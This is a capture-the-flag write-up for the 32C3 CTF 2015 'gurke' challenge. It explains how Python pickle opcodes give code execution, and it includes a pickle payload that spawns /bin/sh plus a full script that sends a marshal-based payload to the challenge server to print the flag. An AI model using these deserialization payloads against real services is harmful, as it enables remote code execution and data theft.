# 32C3 CTF 2015: gurke - Misc 300

> Non-standard [gurke](./gurke.py): <https://32c3ctf.ccc.ac/uploads/gurke> Talk to it via HTTP on <http://136.243.194.43/.>

For this challenge, there is a script running on a server, and we are given the [source](./gurke.py). The server only accepts POST requests, and processes the data included in the request.

There are basically 3 parts to this program:

1. Load the flag and save in in an object called `flag` (so it is accessible as `flag.flag`)
2. Start a seccomp sandbox
3. Read the POST data sent in by the user, unpickle it, and print the result

Since this program accepts our own pickle data, we can easily achieve arbitrary code execution by taking advantage of how pickle works.

## Pickle Code Execution
Pickle is a stack-based language, and its intended usage is to serialize and deserialize objects. In order to get our own code to execute, there are 6 pickle operations we need to understand:

1. `c`: Reads to the next newline as the `module`, then reads the next line as the `object`. It then pushes `module.object` onto the stack
2. `(`: Pushes a marker onto the stack, which can be used alongside `t` to create a tuple
3. `t`: Pops objects off the stack until it reaches a `(`, then creates a tuple of all the popped objects and pushes it onto the stack
4. `S`: Reads a string in quotes and pushes it onto the stack
5. `R`: Pops a tuple and a callable off the stack, then calls the callable with the tuple as its arguments
6. `.`: End of the pickle

## Code Execution Example

Using these commands, here's an example of how to get a shell using pickle, just for demonstration:

```
cos
system
(S'/bin/sh'
tR.
```
This will cause pickle to start a shell following these steps:

1. `c` is reached,  then read `os` as the module and `system` as the object, so it pushes `os.system` onto the stack
2. The `(` marker is pushed onto the stack
3. `S` is reached, so it reads `'/bin/sh'` as a string and pushes it onto the stack
4. Reading in the `t`, it pops `'/bin/sh'` off the stack, puts it in a tuple, and pushes the tuple back onto the stack
5. Finally, the `R` is reached, so it pops `('/bin/sh')` and `os.system` off the stack, and calls `os.system('/bin/sh')`

## Running Our Own Code

While the above works for making simple calls, arbitrary code can't be pickled in the same way. However, thanks to a python library called marshal, a custom function can be serialized and sent to the server, where pickle can use marshal to deserialize and call it.

Any function can be serialized as a base64 string using marshal like so:
```python
def func():
	print "Hello World!"

print base64.b64encode(marshal.dumps(func.func_code))
```

Which results in something like:

```
YwAAAAAAAAAAAQAAAEMAAABzCQAAAGQBAEdIZAAAUygCAAAATnMMAAAASGVsbG8gV29ybGQhKAAAAAAoAAAAACgAAAAAKAAAAABzNQAAAEM6L1VzZXJzL2thcmVlXzAwMC9QeWNoYXJtUHJvamVjdHMvMzJDMyAyMDE1L2d1cmtlLnB5dAQAAABmdW5jCAAAAHMCAAAAAAE=
```

This allows us to change func() to anything we want, and have it serialized the same way

The base64 string then has to be deserialized and called by pickle, using only a series of function calls. This can be done like so:

```python
(types.FunctionType(marshal.loads(base64.b64decode('YwAAAAAAAAAAAQAA....')), globals(), ''))()
```

Which then translates to a pickle string that can be easily sent to the server as:

```
ctypes
FunctionType
(cmarshal
loads
(cbase64
b64decode
(S'YwAAAAAAAAAAAQAA....'
tRtRc__builtin__
globals
(tRS''
tR(tR.
```

Using this as a template, I wrote a script to send a pickled function to the server that would print out the flag. (**NOTE:** Printing to stdout didn't seem to be working, so the code being sent prints to stderr)

```python
import base64
import marshal
import requests


# This function will be serialized and sent to the server,
# then pickle will deserialize and call it
def func():
    import sys

    # Printing to stdout doesn't work, so this prints to stderr
    def p(m):
        print >> sys.stderr, m

    # Use p() to print stuff
    p("TEST")

    # When this function is called, we will be inside the pickle module,
    # so to print the flag it has to be accessed from __main__
    import __main__
    p(__main__.flag.flag)


# Wizardry to get pickle to execute the above function on the server
pckl = "ctypes\nFunctionType\n(cmarshal\nloads\n(cbase64\nb64decode\n(S'%s'\ntRtRc__builtin__\nglobals\n(tRS''\ntR(tR." % base64.b64encode(marshal.dumps(func.func_code))
r = requests.post('http://136.243.194.43', pckl)  # Send the pickle
print r.text

```

Then running the above code, the flag is printed out:
```
32c3_rooDahPaeR3JaibahYeigoong
```

If you're interested in reading more about code execution with pickle, check out [this article](https://www.cs.uic.edu/~s/musings/pickle.html), and [this paper](https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf)